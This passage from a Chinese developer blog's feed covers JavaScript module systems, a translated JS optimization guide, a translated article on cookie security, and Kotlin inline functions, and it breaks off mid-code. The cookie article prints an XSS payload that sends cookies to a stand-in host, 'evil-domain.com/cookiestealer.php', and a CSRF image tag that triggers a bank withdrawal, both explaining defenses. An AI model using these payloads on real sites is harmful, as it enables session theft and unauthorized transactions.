    <id>https://deskid.github.io/2017/11/28/module-in-js/</id>
    <published>2017-11-27T16:16:44.000Z</published>
    <updated>2018-11-14T03:16:27.501Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript 在ES6之前没有给出官方模块的定义，因此社区自己搞了两个模块加载方案：</p><ul><li>CommonJS (node)</li><li>AMD (browser) 本文略</li></ul><a id="more"></a><h3 id="commonjs规范">CommonJS规范</h3><h4 id="module定义">module定义:</h4><p>每个文件就是一个模块，文件有自己的私有内部作用域。<code>module</code>对象代表当前模块，<code>module.exports</code> 是对外暴露的接口。加载模块，实际上是加载 <code>module.exports</code>.</p><p><code>exports</code> 是 <code>module.exports</code> 的引用，其实质是 node 提供的语法糖, 本质类似于每个模块开头都include了下面的代码。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> exports = <span class="built_in">module</span>.exports;</span><br></pre></td></tr></table></figure><p>如修改<code>exports</code>对象的属性，等价于修改了<code>module.exports</code>。虽然这样提供了方便，但是直接改变<code>exports</code>对象的指向是个不好的实践。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//utils.js</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">exports.a = <span class="number">200</span>;</span><br></pre></td></tr></table></figure><p>引入的时候，<code>require</code> 导入的是 <code>module.exports</code> 指向的一个对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'/utils'</span>);</span><br><span class="line"><span class="comment">// var &#123;a&#125; = require('/utils'); //200</span></span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// &#123;a : 200&#125;</span></span><br></pre></td></tr></table></figure><h3 id="es6-规范">ES6 规范</h3><h4 id="export命令">export命令</h4><p><code>export</code> 命令定义了模块的输出、其值可以是 value，variable、function、class，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//profile.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> lastName = <span class="string">"xxx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">var</span> firstName = <span class="string">"xxx"</span></span><br><span class="line"><span class="comment">//优先使用这种，便于统一一个地方export</span></span><br><span class="line"><span class="keyword">export</span> &#123;firstName&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// export function</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.PI * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">circumference</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * <span class="built_in">Math</span>.PI * radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="import命令">import命令</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;firstName, lastName&#125; <span class="keyword">from</span> <span class="string">'profile'</span>; <span class="comment">//变量</span></span><br><span class="line"><span class="keyword">import</span> &#123; area, circumference &#125; <span class="keyword">from</span> <span class="string">'circle'</span>; <span class="comment">//方法</span></span><br></pre></td></tr></table></figure><p><code>import</code>大括号内的变量名必须与<code>export</code>一致。（在webstrom等IDE中会帮你静态检查的）</p><!-- more --><h4 id="module命令">module命令</h4><p>module 是个语法糖。有时候，需要import所有的接口</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> circle <span class="keyword">from</span> <span class="string">'circle'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"圆面积："</span> + circle.area(<span class="number">4</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"圆周长："</span> + circle.circumference(<span class="number">14</span>));</span><br></pre></td></tr></table></figure><p>可以写成</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span> circle <span class="keyword">from</span> <span class="string">'circle'</span></span><br></pre></td></tr></table></figure><h4 id="export-default-命令">export default 命令</h4><p>export default命令定义了模块导出的默认值，引入默认值时不用加大括号。这个命令其实也是语法糖：</p><p>把导出值封装到了一个<code>default</code>对象，再在引入时解构这个<code>default</code>对象。因为有一个对象来承接中间的值，所以在<code>import</code>时可以用任意<code>key</code>指定被引入的值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default class &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">import MyClass from &apos;MyClass&apos;</span><br><span class="line">let o = new MyClass();</span><br></pre></td></tr></table></figure><h3 id="babel">Babel</h3><p>在ES6出来之前社区上已经有许多CommonJS的module，托Babel的福，可以直接使用ES6的新语法来引入这些只支持CommonJS标准的库。</p><p>Babel 做了一层翻译，把ES6的import、export语法变成了兼容CommonJS规范的require、exports。</p><h4 id="1-export-babel翻译：">1. export babel翻译：</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="number">21</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(exports, <span class="string">"__esModule"</span>, &#123;</span><br><span class="line">  value: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> foo = exports.foo = <span class="number">42</span>;</span><br><span class="line">exports.default = <span class="number">21</span>;</span><br></pre></td></tr></table></figure><p>上面可以看到export default 和普通的export foo一样，都是给exports对象添加属性。</p><h4 id="2-import-babel翻译：">2. import babel翻译：</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></span><br></pre></td></tr></table></figure><p>==========&gt;</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _react = <span class="built_in">require</span>(<span class="string">'react'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _react2 = _interopRequireDefault(_react);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_interopRequireDefault</span>(<span class="params">obj</span>) </span>&#123; <span class="keyword">return</span> obj &amp;&amp; obj.__esModule ? obj : &#123; <span class="attr">default</span>: obj &#125;; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过_react2.default引用</span></span><br></pre></td></tr></table></figure><p>export default 和 import 的使用要结合一起看：</p><p>上面的export default翻译为了<code>exports.default</code>；</p><p>import命令则要先判断：对经过了 babel 翻译后export的module直接返回对象，否则先用对象包装一层，并把export值赋值给<code>default</code>属性；最终在代码中使用时，统一使用<code>moduleName.default</code> 引用。</p><p>普通的非default import语法就简单了，和require一模一样，导入时需要添加<code>{}</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br></pre></td></tr></table></figure><p>===========&gt;</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _react = <span class="built_in">require</span>(<span class="string">'react'</span>);</span><br><span class="line"><span class="comment">//通过_react.Component引用</span></span><br></pre></td></tr></table></figure><p>参考</p><ol><li><a href="http://es6.ruanyifeng.com/#docs/module" target="_blank" rel="noopener">http://es6.ruanyifeng.com/#docs/module</a></li><li><a href="http://babeljs.io/repl/" target="_blank" rel="noopener">http://babeljs.io/repl/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JavaScript 在ES6之前没有给出官方模块的定义，因此社区自己搞了两个模块加载方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CommonJS (node)&lt;/li&gt;
&lt;li&gt;AMD (browser) 本文略&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 代码优化(译)</title>
    <link href="https://deskid.github.io/2017/11/27/JavaScript-%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96/"/>
    <id>https://deskid.github.io/2017/11/27/JavaScript-代码优化/</id>
    <published>2017-11-27T15:47:14.000Z</published>
    <updated>2018-11-14T03:17:03.574Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://developers.google.com/speed/articles/optimizing-javascript" target="_blank" rel="noopener">https://developers.google.com/speed/articles/optimizing-javascript</a></p><p>作者: Gregory Baker, Software Engineer on GMail &amp; Erik Arvidsson, Software Engineer on Google Chrome</p><a id="more"></a><h3 id="不要在constructor中定义类方法-应该使用原型">不要在constructor中定义类方法，应该使用原型。</h3><p>下面的代码会在每次构造<code>baz.Bar</code>实例时，创建一个新的function实例；随着foo创建的同时还创建了一个闭包：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baz.Bar = function() &#123;</span><br><span class="line">  // constructor body</span><br><span class="line">  this.foo = function() &#123;</span><br><span class="line">    // method body</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推荐下面的方式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baz.Bar = function() &#123;</span><br><span class="line">  // constructor body</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">baz.Bar.prototype.foo = function() &#123;</span><br><span class="line">  // method body</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>无论创建多少<code>baz.Bar</code>实例，只有一个<code>foo</code> function被创建，同时避免了闭包。</p><h3 id="在prototype上申明-初始化数值型的实例变量的初始值">在prototype上申明、初始化数值型的实例变量的初始值</h3><blockquote><p>数值型:比如:number, Boolean, null, undefined, or string<br>引用型:略</p></blockquote><p>避免了构造时，每次都调用无用的初始化代码。(与构造函数参数相关的实例变量除外)</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo.Bar = function() &#123;</span><br><span class="line">  this.prop1_ = 4;</span><br><span class="line">  this.prop2_ = true;</span><br><span class="line">  this.prop3_ = [];</span><br><span class="line">  this.prop4_ = &apos;blah&apos;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo.Bar = function() &#123;</span><br><span class="line">  this.prop3_ = [];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.Bar.prototype.prop1_ = 4;</span><br><span class="line"></span><br><span class="line">foo.Bar.prototype.prop2_ = true;</span><br><span class="line"></span><br><span class="line">foo.Bar.prototype.prop4_ = &apos;blah&apos;;</span><br></pre></td></tr></table></figure><!-- more --><h3 id="回避闭包带来的缺陷">回避闭包带来的缺陷</h3><p>闭包是JavaScript语言强大且有用的特性；然而同时也存在着许多缺陷：</p><ul><li>内存泄露是闭包最常见的缺点。</li><li>创建闭包比创建 <code>inner function</code> 更慢，而<code>inner function</code>又慢于<code>static function</code>。</li></ul><p>举例:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function setupAlertTimeout() &#123;</span><br><span class="line">  var msg = &apos;Message to alert&apos;;</span><br><span class="line">  window.setTimeout(function() &#123; alert(msg); &#125;, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>慢于下面代码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function setupAlertTimeout() &#123;</span><br><span class="line">  window.setTimeout(function() &#123;</span><br><span class="line">    var msg = &apos;Message to alert&apos;;</span><br><span class="line">    alert(msg);</span><br><span class="line">  &#125;, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而上述代码又慢于下面代码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function alertMsg() &#123;</span><br><span class="line">  var msg = &apos;Message to alert&apos;;</span><br><span class="line">  alert(msg);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">function setupAlertTimeout() &#123;</span><br><span class="line">  window.setTimeout(alertMsg, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>闭包增加了语义链的层级，浏览器在resolves属性时，每一层的语义链都会被检查 :</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a = &apos;a&apos;;</span><br><span class="line">    </span><br><span class="line">function createFunctionWithClosure() &#123;</span><br><span class="line">  var b = &apos;b&apos;;</span><br><span class="line">  return function () &#123;</span><br><span class="line">    var c = &apos;c&apos;;</span><br><span class="line">    a;</span><br><span class="line">    b;</span><br><span class="line">    c;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">var f = createFunctionWithClosure();</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p>当调用<code>f</code>时，referencing 效率：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &lt;  b &lt; c</span><br></pre></td></tr></table></figure><p>参考 <a href="http://blogs.msdn.com/ie/archive/2007/01/04/ie-jscript-performance-recommendations-part-3-javascript-code-inefficiencies.aspx" target="_blank" rel="noopener">IE+JScript Performance Recommendations Part 3: JavaScript Code inefficiencies</a>  了解 IE 下的闭包.</p><h3 id="避免使用-with">避免使用 <code>with</code></h3><p>避免使用 <code>with</code>，它不仅影响效率，还修改了scope chain，导致查找变量的开销变得更加昂贵。</p><h3 id="避免浏览器内存泄露">避免浏览器内存泄露</h3><p>内存泄露在 web 应用中太常见了，而且会引起严重的性能问题。<br>最常见的内存泄露是JavaScript引擎和浏览器C++ DOM对象(比如IE COM 基础组件，Firefox XPCOM 基础组件)循环引用</p><h4 id="use-an-event-system-for-attaching-event-handlers">Use an event system for attaching event handlers</h4><p>一种最常见的循环引用模式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ DOM element --&gt; event handler --&gt; closure scope --&gt; DOM element]</span><br></pre></td></tr></table></figure><p>参考 <a href="http://blogs.msdn.com/ericlippert/archive/2003/09/17/53028.aspx" target="_blank" rel="noopener">MSDN blog post</a>.</p><p>要想避免这种情况，可以使用 <a href="http://code.google.com/p/doctype/source/browse/trunk/goog/events/events.js#348" target="_blank" rel="noopener">Google doctype</a>, <a href="http://api.dojotoolkit.org/jsdoc/1.3/dojo.connec" target="_blank" rel="noopener">Dojo</a>, or <a href="http://docs.jquery.com/Events/bind#typedatafn" target="_blank" rel="noopener">JQuery</a>等成熟的事件处绑定库。</p><p>另外在 IE 中使用inline event handlers 会造成另外一种泄露，不同于普通的循环引用，泄露的是一种内部零时匿名script对象。</p><p>详情可参考 <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/ietechcol/dnwebgen/ie_leak_patterns.asp" target="_blank" rel="noopener">Understanding and Solving Internet Explorer Leak Patterns</a> “DOM Insertion Order Leak Model” 章节。<br>具体例子 <a href="http://www.javascriptkit.com/javatutors/closuresleak/index.shtml" target="_blank" rel="noopener">JavaScript Kit tutorial</a>.</p><h4 id="避免-expando-properties">避免 expando properties</h4><blockquote><p>Expando properties are properties added to DOM nodes with JavaScript, where those properties are not part of the object’s DOM specification:</p></blockquote><p>通过dot访问一个不存在的DOM属性时，javascript会自动创建一个Expando properties。<br>这种行为通常导致循环引用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ DOM element --&gt; via expando--&gt; intermediary object --&gt; DOM element ]</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// First set up the script scope to element reference</span></span><br><span class="line">  myGlobalObject =</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">"LeakedDiv"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Next set up the element to script scope reference</span></span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"LeakedDiv"</span>).expandoProperty =</span><br><span class="line">      myGlobalObject;</span><br></pre></td></tr></table></figure><p>最佳实践是不用使用。如果非要用这种特性不可，仅仅访问 primitive类型</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>];</span><br><span class="line">div.someProperty = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>或者将expando property置为null。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"LeakedDiv"</span>).expandoProperty =</span><br><span class="line">               <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>参考  <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/ietechcol/dnwebgen/ie_leak_patterns.asp" target="_blank" rel="noopener">Understanding and Solving Internet Explorer Leak Patterns</a>&quot;Circular References&quot; 章节。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://developers.google.com/speed/articles/optimizing-javascript&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://developers.google.com/speed/articles/optimizing-javascript&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者: Gregory Baker, Software Engineer on GMail &amp;amp; Erik Arvidsson, Software Engineer on Google Chrome&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Cookies and security(译)</title>
    <link href="https://deskid.github.io/2017/11/26/cookies-and-security/"/>
    <id>https://deskid.github.io/2017/11/26/cookies-and-security/</id>
    <published>2017-11-26T05:24:21.000Z</published>
    <updated>2018-11-14T03:17:24.317Z</updated>
    
    <content type="html"><![CDATA[<p>Posted at May 12, 2009 by Nicholas C. Zakas<br><a href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/" target="_blank" rel="noopener">原文</a></p><p>事实上关于cookie的安全策略有很多，cookie本身和安全相关的属性有 <code>domain</code>, <code>path</code>, and <code>secure</code>, 但是由于网页的天性使得cookie安全变得更加复杂。</p><a id="more"></a><h2 id="user-logins-and-session-hijacking">User logins and session hijacking</h2><p>cookie最常见的一种用途是跟踪login状态。</p><p>服务端在校验通过登录账号和密码后返回的cookie中记录了能标识当前用户的信息。同站的其他请求都会带上这个cookie来验证登陆状态。大多数站点都是使用的session cookie，在关闭浏览器后cookie就销毁了，也有一些提供了“remember me” 选项，比如提供一星期内不用重新登录的功能。</p><p>使用抓包攻击可以轻易的伪造用户身份，服务端无法分辨身份是否是伪造的。防止session hijacking有以下方法：</p><ol><li><p>上 https，使用 SSL 来传输cookie。</p></li><li><p>在session key中添加更多local或者随机信息，比如 ip，login time，使得伪造cookie更加困难。</p></li><li><p>对于关键操作，要求重新验证用户信息。比如支付、修改密码等等</p></li></ol><!-- more --><h2 id="third-party-cookies">Third-party cookies</h2><p>网页上往往会引用外部站点上的资源，比如css，script，iframe等。</p><p>在访问外部站点时，本域下的cookie不会被发送；同时，本域也无法访问外部站点返回的cookie</p><ul><li>Using a <code>&lt;link&gt;</code> tag to include a style sheet.</li><li>Using a <code>&lt;script&gt;</code> tag to include a JavaScript file.</li><li>Using an <code>&lt;object&gt;</code> or tag to include media files.</li><li>Using an <code>&lt;iframe&gt;</code> tag to include another HTML file.</li></ul><p>外部返回的cookie有啥用呢？</p><p>假设 Page A 访问了一个外部链接，第三方服务器返回一个记录了 <code>Referer</code> 的cookie，Page B 这时也访问该外部链接，这个cookie就会被发给第三方服务器，从而暴露了用户的访问记录。第三方服务器就知道了用户访问了Page A又访问了Page B，而仅仅根据这些信息就可以做一些广告推荐。</p><p>这些 cookies 被称为 tracking cookies。当然这些也不太可能会造成安全威胁，但是这个概念在更大规模的安全领域讨论中很重要。</p><h2 id="cookie-stealing-and-xss">Cookie stealing and XSS</h2><p>加载一个第三方域名下的JavaScript有巨大的安全隐患。 尽管在请求第三方 JavaScript 资源时不会发送本域名下的cookie，但是script还是可以读取到cookie。同一页面下的所有的JavaScript都被认为是运行在同一个domain、path、protocol下。这时访问<code>document.cookie</code>即可获取到cookie了。</p><p>举个例子说明：</p><p>页面A从第三方站点<code>evil-domain.com</code>加载了某个JavaScript，上线之后<code>evil-domain.com</code> 将该JavaScript改为如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/cookiestealer.php?cookie=&quot; + cookie.domain;</span><br></pre></td></tr></table></figure><p>页面A下的cookie就这样被静默的发送给了<code>evil-domain.com</code>。</p><p>这种注入第三方的JavaScript的攻击方式也叫做XSS(cross-site scripting)攻击。</p><p>除了不小心include了一个可疑的script之外，XSS攻击还有可能是因为没有做输入过滤。</p><p>比如这个<a href="http://www.steve.org.uk/Hacks/XSS/simple.html" target="_blank" rel="noopener">网站</a>会将用户的的输入显示在网页上，当用户输入如下内容，cookie同样也会被盗取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/cookiestealer.php?cookie=&quot; + cookie.domain;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>防止XSS：</p><ol><li>不要随便 include 来自可疑域名的 JavaScript；尽量选择大公司的CDN；</li><li>总是过滤或者sanitize用户的输入，不要直接输出用户的输入。</li></ol><p>HTTP-only cookies 是cookie标准的重要补充，script无法通过<code>document.cookie</code>读取被标记为 HTTP-only 的cookie。(注：目前所有的浏览器都实现了该标准)</p><h2 id="cross-site-request-forgery-csrf">Cross-site request forgery (CSRF)</h2><p>另外一种涉及到cookie的攻击是cross-site request forgery(CSRF)。这种攻击工作的原理是欺骗浏览器以用户的身份发送危险请求、例如转账、支付等。这种攻击常常利用XSS技术或者简单的HTML。</p><p>Wikipedia 展示了一个例子：</p><p>在一个没有过滤用户输入的论坛上，发布下面这样的一张图片。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure><p>如果你恰好登录了 <code>bank.example</code> 当你浏览这个帖子时就会发起一个转账请求。</p><p>和预防XSS一样，输入过滤也可以阻止CSRF攻击<br>其它的一些预防措施如下:</p><ul><li>对于敏感信息需要重新验证用户身份。</li><li>对于敏感系统，Cookies 的失效时间应尽可能的短。</li><li>不仅验证cookies，还要验证referer 或者 request type (POST instead of GET).</li></ul><p>由于CSRF攻击一旦触发很难排查，所以预防是关键。</p><h2 id="conclusion">Conclusion</h2><p>虽然列举了这么多关于cookie的安全攻击方式，但是，只要采取了合适的预防措施，使用cookie是安全的。</p><p>单单验证用户输入这个举措，就可以显著降低攻击数量，而且是一个低成本，高回报的预防措施，</p><p>最总要的是保持关注安全问题，紧跟最新技术防止攻击。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Posted at May 12, 2009 by Nicholas C. Zakas&lt;br&gt;
&lt;a href=&quot;https://www.nczonline.net/blog/2009/05/12/cookies-and-security/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;事实上关于cookie的安全策略有很多，cookie本身和安全相关的属性有 &lt;code&gt;domain&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, and &lt;code&gt;secure&lt;/code&gt;, 但是由于网页的天性使得cookie安全变得更加复杂。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="cookie" scheme="https://deskid.github.io/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>kotlin 深入学习笔记(四)</title>
    <link href="https://deskid.github.io/2017/09/07/kotlin-learn-notes-4/"/>
    <id>https://deskid.github.io/2017/09/07/kotlin-learn-notes-4/</id>
    <published>2017-09-07T03:46:23.000Z</published>
    <updated>2018-11-14T03:18:19.802Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍kotlin的<code>inline</code>关键字。</p><a id="more"></a><h3 id="inline">inline</h3><p>在kotlin中使用高阶方法确实很方便，但是这种便利是有代价的。我们知道 lambda 表达式其实就是一个 Function 对象。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun nonInlined(block: () -&gt; Unit) &#123;</span><br><span class="line">    println(&quot;before&quot;)</span><br><span class="line">    block()</span><br><span class="line">    println(&quot;after&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应Java代码为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void nonInlined(Function block) &#123;</span><br><span class="line">    System.out.println(&quot;before&quot;);</span><br><span class="line">    block.invoke();</span><br><span class="line">    System.out.println(&quot;after&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在kotlin中调用时</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nonInlined &#123;</span><br><span class="line">    println(&quot;do something here&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会被编译为下面的代码（简化）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nonInlined(new Function() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void invoke() &#123;</span><br><span class="line">        System.out.println(&quot;do something here&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里每次调用<code>nonInlined()</code>都会创建一个Function对象。如果这里调用的是非常通用的高阶函数，那么每次调用都会带来额外的内存、运行开销。</p><p><code>inline</code> 就是 kotlin 是用来优化这个问题的关键字。</p><!-- more --><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inline fun inlined(block: () -&gt; Unit) &#123;</span><br><span class="line">    println(&quot;before&quot;)</span><br><span class="line">    block()</span><br><span class="line">    println(&quot;after&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用和之前一样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inlined &#123;</span><br><span class="line">    println(&quot;do something here&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应编译后的代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;before&quot;);</span><br><span class="line">System.out.println(&quot;do something here&quot;);</span><br><span class="line">System.out.println(&quot;after&quot;);</span><br></pre></td></tr></table></figure><p>使用inline可以增加运行效率，降低内存占用。相应的，带来的副作用就是代码膨胀。所以，inline 的最佳使用场景是一些短小的高阶函数，或者需要在循环中调用的函数。</p><p>在 kotlin std 库中定义的高阶函数基本上都是被inline 修饰的，我们自己在写库时也可以使用这个优化点。</p><p>但是，被inline的函数有一些副作用。</p><p>1、被inline的函数，无法在函数内部访问private变量、方法(除非用<code>internal</code>和<code>@PublishedApi</code>修饰)。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private val aPrivateMemberVariable = &quot;I&apos;m private&quot;</span><br><span class="line"></span><br><span class="line">@PublishedApi</span><br><span class="line">internal val anInternalMemberVariable = &quot;I&apos;m internal&quot;</span><br><span class="line"></span><br><span class="line">val aPublicMemberVariable = &quot;I&apos;m public&quot;</span><br><span class="line"></span><br><span class="line">inline fun higherOrderFunction(aLambda: () -&gt; Unit) &#123;</span><br><span class="line"></span><br><span class="line">    //ERROR: can&apos;t access this variable in an inline function.</span><br><span class="line">    aPrivateMemberVariable.length</span><br><span class="line"></span><br><span class="line">    //Can access this variable because it&apos;s marked with @PublishedApi and internal</span><br><span class="line">    anInternalMemberVariable.length</span><br><span class="line"></span><br><span class="line">    //Can access this variable, it&apos;s public</span><br><span class="line">    aPublicMemberVariable.length</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、在被<code>inline</code>修饰的Function闭包内运行的lambda 中，可以使用 return 退出 calling 函数。</p><p>这种特性也被称为<code>non-local control flow</code>。<br>这样做其实是为了让我们可以在<code>forEach</code>中的lambda有能力控制循环。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun hasZeros(ints: List&lt;Int&gt;): Boolean &#123;</span><br><span class="line">    ints.forEach &#123;</span><br><span class="line">        if (it == 0) return true // returns from hasZeros</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，截止到1.1.4，kotlin 还不支持在<code>non-local control flow</code>中使用<code>break</code>和<code>continue</code>。😂</p><p>这个特性其实很容易产生bug，因为这样做的话，相当于剥夺了高阶函数对lambda运行的控制。比如在涉及资源处理时，乱用return很容易跳过了资源释放语句，而且不易调试。</p><p>而正常的lambda是没有能力return执行函数的，只能通过 <code>return@label</code> 的方式跳出 lambda自身。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inline fun higherOrderFunction(aLambda: () -&gt; Unit) &#123;</span><br><span class="line"></span><br><span class="line">    aLambda()</span><br><span class="line"></span><br><span class="line">    print(&quot;I won&apos;t be executed when you call callingFunction()&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun callingFunction() &#123;</span><br><span class="line"></span><br><span class="line">    higherOrderFunction &#123;</span><br><span class="line"></span><br><span class="line">        